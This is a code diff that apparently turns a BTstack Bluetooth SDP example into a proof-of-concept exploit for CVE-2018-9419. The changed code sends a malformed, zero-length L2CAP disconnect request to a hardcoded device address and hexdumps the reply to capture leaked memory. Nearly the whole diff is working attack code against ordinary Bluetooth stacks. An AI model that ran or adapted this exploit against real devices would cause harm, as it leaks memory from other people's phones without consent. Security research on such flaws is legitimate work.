@@ -5,6 +5,7 @@
 #define __BTSTACK_FILE__ "sdp_general_query.c"
 
 #include "btstack_config.h"
+#include "btstack_util.h"
 
 #include <stdint.h>
 #include <stdio.h>
@@ -36,10 +37,11 @@ static void sdp_client_init(void){
 static bd_addr_t remote = {0x98,0x01,0xA7,0x9D,0xC1,0x94};
 
 static void l2cap_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size) {
-    printf("Packet type: %d\n", packet_type);
+    printf("[+] Got l2cap response");
+    printf_hexdump(packet, size);
 }
 
-void do_l2cap_connect() {
+static void do_l2cap_connect() {
     uint8_t status = l2cap_create_channel(l2cap_packet_handler, remote, 3, l2cap_max_mtu(), NULL);
     printf("Status: %d", status);
 
@@ -47,10 +49,19 @@ void do_l2cap_connect() {
     l2cap_reserve_packet_buffer();
     uint8_t *buffer = l2cap_get_outgoing_buffer();
 
-    buffer[pos++] = '\xff';
-    buffer[pos++] = '\xff';
-    buffer[pos++] = '\xff';
-    int err = l2cap_send_prepared(2, pos);
+    // CVE-2018-9419 - Info leak via BLE?
+
+    // cmd_code == L2CAP_CMD_DISC_REQ
+    buffer[0] = 0x06;
+
+    // id
+    buffer[1] = 0x00;
+
+    // cmd_len
+    buffer[2] = 0x00;
+    buffer[3] = 0x00;
+
+    int err = l2cap_send_prepared(5, pos);
     printf("Error: %d\n", err);
 }
 
@@ -119,7 +130,10 @@ int btstack_main(int argc, const char * argv[]){
     (void)argc;
     (void)argv;
 
-    if (!sscanf_bd_addr("98:01:A7:9D:C1:94", remote)) {
+    //char *bdaddr = "98:01:A7:9D:C1:94";
+    char *bdaddr = "D4:61:2E:12:67:7A";
+
+    if (!sscanf_bd_addr(bdaddr, remote)) {
         printf("%s <bd addr>\n", argv[0]);
         exit(-1);
     }
